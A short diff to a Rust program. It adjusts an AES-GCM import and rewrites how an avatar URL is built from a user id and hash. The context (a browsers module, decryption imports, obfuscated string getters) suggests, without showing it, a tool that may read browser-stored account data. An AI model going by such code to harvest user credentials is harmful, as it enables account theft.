@@ -2,7 +2,8 @@
 
 mod browsers;
 
-use aes_gcm::{Aead, Aes256Gcm, Key, KeyInit, Nonce};
+use aes_gcm::aead::Aead;
+use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce};
 use base64::{engine::general_purpose, Engine as _};
 use regex::Regex;
 use serde::{Deserialize, Serialize};
@@ -788,10 +789,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                 .avatar
                                                                 .as_ref()
                                                                 .map(|h| {
-                                                                    format!(
-                                                                        s_avatar_url_fmt(),
-                                                                        user.id, h
-                                                                    )
+                                                                    s_avatar_url_fmt()
+                                                                        .replacen("{}", &user.id, 1)
+                                                                        .replacen("{}", h, 1)
                                                                 })
                                                                 .unwrap_or_else(|| {
                                                                     s_default_avatar_url()
